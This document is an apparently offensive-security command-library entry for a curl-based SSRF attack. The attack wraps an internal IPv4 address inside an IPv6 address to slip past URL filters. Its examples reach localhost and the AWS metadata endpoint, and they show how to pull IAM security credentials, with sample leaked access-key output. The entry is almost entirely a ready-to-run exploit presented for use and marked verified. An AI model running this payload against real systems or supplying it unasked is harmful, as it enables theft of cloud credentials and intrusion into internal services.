---
id: 3cf9ad96-6593-4d07-9279-a58f74063a04
name: curl-send-ipv6-embedded-ssrf-payload
type: command
executor: bash
data: >-
  curl -X POST http://$_TARGET_APP/ssrf-endpoint -d
  "url=http://[0:0:0:0:0:ffff:$_TARGET_IP]/$_TARGET_PATH"
output: null
created_at: '2023-04-06T03:56:37.416345+00:00'
updated_at: '2023-04-10T20:24:15.595760+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - bypass
  - curl
verified: true
validated: true
---

# curl-send-ipv6-embedded-ssrf-payload

## Command

```bash
curl -X POST http://$_TARGET_APP/ssrf-endpoint -d "url=http://[0:0:0:0:0:ffff:$_TARGET_IP]/$_TARGET_PATH"
```

## Description

This command uses curl to send an HTTP POST request to an SSRF-vulnerable endpoint, injecting an IPv6-embedded IPv4 URL to bypass filters and fetch internal resources. It is used when direct IPv4 access is blocked but IPv6 is permitted.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_APP | The vulnerable application's base URL (e.g., vulnerable-app.com) | Yes |
| $_TARGET_IP | The internal IPv4 address to embed (e.g., 127.0.0.1 for localhost, 169.254.169.254 for AWS metadata) | Yes |
| $_TARGET_PATH | The path on the internal resource to access (e.g., /etc/passwd or /latest/meta-data/) | Yes |
| -X POST | Specifies the HTTP method as POST | Built-in |
| -d | Sends data in the POST body | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST http://vulnerable-app.com/ssrf-endpoint -d "url=http://[0:0:0:0:0:ffff:127.0.0.1]/"
```

Targets localhost root path.

### Advanced Usage

```bash
curl -X POST http://target.com/api/fetch -d "url=http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/role" -H "Content-Type: application/x-www-form-urlencoded"
```

Fetches AWS IAM credentials via embedded metadata endpoint, with custom header.

## Expected Output

If successful, the response body contains the internal resource's content, such as:
```
<html><body>Localhost default page</body></html>
```
or JSON metadata:
```
{"Code" : "Success", "AccessKeyId" : "ASIA...", ...}
```
Failure shows errors like "Invalid URL" or empty response if blocked.

## Related

- [[procedures/Perform-SSRF-Using-IPv6-IPv4-Address-Embedding]]
- [[tools/cURL]]
